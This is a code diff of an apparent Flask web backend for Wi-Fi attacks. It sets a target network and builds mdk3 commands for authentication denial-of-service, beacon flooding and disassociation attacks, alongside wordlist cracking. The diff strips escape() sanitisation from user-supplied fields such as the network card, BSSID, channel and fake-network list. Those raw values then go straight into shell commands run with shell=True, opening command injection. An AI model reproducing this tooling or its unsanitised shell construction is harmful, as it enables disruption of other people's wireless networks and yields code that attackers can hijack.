@@ -24,11 +24,13 @@ def getNetcardMon():
     listNetcards = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
     output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
     
-    return ret({"cards": f"{output.stdout.decode()}"})
+    return ret({"netcards": f"{output.stdout.decode()}"})
 
 @app.post('/netcard')
 def setNetcardMon():
-    netcard = escape(request.form['netcard'])
+    request.get_json()
+    data = req(request)
+    netcard = data.get('netcard', '')
     netcardMon = netcard + "mon"
     session["netcardMon"] = netcardMon
     mac = f"{config['mac']['oui']}:12:8c:b6"
@@ -74,15 +76,17 @@ def scan():
 
 @app.post('/target')
 def target():
-    session['bssid'] = escape(request.form['bssid'])
-    session['essid'] = escape(request.form['essid'])
-    session['channel'] = escape(request.form['channel'])
+    data = req(request)
+    session['bssid'] = data.get('bssid')
+    session['essid'] = data.get('essid')
+    session['channel'] = data.get('channel')
     #TODO: Plantear target... aislado o conjunto??
     return ret({"status":"OK"})
 
 @app.post('/attack/<int:id>')
 def attack(id):
-    nPackets = escape(request.form['n'])
+    data = req(request)
+    nPackets = data.get('n')
     netcardMon = session.get('netcardMon')
     bssid = session.get('bssid')
     essid = session.get('essid')
@@ -106,7 +110,7 @@ def attack(id):
             attack = f'mdk3 a -a {bssid} {netcardMon}'
             pass
         case 2: #Beacon Flood Mode Attack
-            fakeNets = escape(request.form['fn'])
+            fakeNets = data.get('fn')
             attack = f'mdk3 b -f {fakeNets} -a -s 1000 -c {channel} {netcardMon}'
             pass
         case 3: #Disassociation Amok Mode Attack
@@ -190,7 +194,7 @@ def cracker(wordlist):
 
 ##Upload wordlists or fakeNetworks
 @app.post('/list/<string:list>')
-def setWordlist(list):
+def setList(list):
     list = escape(list)
     f = request.files['file']
     f.save(f'{list}/{secure_filename(f.filename)}')
@@ -198,7 +202,7 @@ def setWordlist(list):
     return ret({"status":f"saved on {list}/{secure_filename(f.filename)}"})
 
 @app.get('/list/<string:list>')
-def getWordlists(list):
+def getLists(list):
     list = escape(list)
     ls = f'ls {list}'
     output = subprocess.run(ls, check=True, capture_output=True, text=True, shell=True)
